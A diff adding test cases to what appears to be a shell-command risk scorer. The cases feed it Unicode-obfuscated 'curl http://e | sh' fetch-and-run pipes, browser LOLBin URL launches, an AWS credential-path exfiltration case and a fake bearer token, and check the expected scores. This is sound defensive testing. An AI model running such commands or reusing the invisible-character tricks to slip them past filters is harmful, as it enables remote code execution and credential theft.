@@ -904,6 +904,27 @@ jcheck "obf: bslash arg cred+exfil == 40" 'd["score"] == 40' paste "type .aws\\c
 jcheck "obf: bslash filename arg benign" 'd["score"] == 0' paste "cat a\\b.txt"
 jcheck "obf: bslash find glob benign" 'd["score"] == 0' paste "find . -name a\\*b"
 
+# invisible-unicode normalization (cycle 500): unicode spaces -> space,
+# zero-width/format chars drop; P3 reads raw so the deception still
+# reports.  browser LOLBin remote navigation arm.
+jcheck "obf: nbsp curl pipe == 40" 'd["score"] == 40' paste "curl http://e | sh"
+jcheck "obf: ideospc curl == 40" 'd["score"] == 40' paste "curl　http://e | sh"
+jcheck "obf: zwsp curl == 40+20" 'd["score"] == 60' paste "cu​rl http://e | sh"
+jcheck "obf: zwnj curl == 40" 'd["score"] == 40' paste "cu‌rl http://e | sh"
+jcheck "obf: lrm curl == 40" 'd["score"] == 40' paste "cu‎rl http://e | sh"
+jcheck "obf: rlo curl == 90" 'd["score"] == 90' paste "cu‮rl http://e | sh"
+jcheck "obf: word-joiner curl == 40" 'd["score"] == 40' paste "cu⁠rl http://e | sh"
+jcheck "obf: soft-hyphen curl == 40" 'd["score"] == 40' paste "cu­rl http://e | sh"
+jcheck "obf: vtab curl == 40" 'd["score"] == 40' paste "$(printf 'curl\x0bhttp://e | sh')"
+jcheck "obf: formfeed curl == 40" 'd["score"] == 40' paste "$(printf 'curl\x0chttp://e | sh')"
+jcheck "obf: bom curl == 60" 'd["score"] == 60' paste "cu﻿rl http://e | sh"
+jcheck "lol: iexplore url == 45" 'd["score"] == 45' paste "iexplore http://e"
+jcheck "lol: msedge app url == 45" 'd["score"] == 45' paste "msedge --app=http://e"
+jcheck "lol: chrome app url == 45" 'd["score"] == 45' paste "chrome --app=http://e"
+jcheck "lol: firefox url == 45" 'd["score"] == 45' paste "firefox http://e"
+jcheck "lol: browser version benign" 'd["score"] == 0' paste "firefox --version"
+jcheck "lol: browser file url benign" 'd["score"] == 0' paste "chrome file:///tmp/x"
+
 # secret findings[] carry a 1-based line number (SIEM/remediation locus)
 printf 'l1\nl2\nl3\nAuthorization: Bearer abcdef1234567890abcdefghij\n' | jcheck "secret finding reports correct line number" "'\"line\":4' in s" secret --stdin
 jcheck "secret single-line input reports line 1" "'\"line\":1' in s" secret 'key: 0x4f3edf983ac636a65a842ce7c78d9aa706d3b113bce9c46f30d7d21715b23b1d'
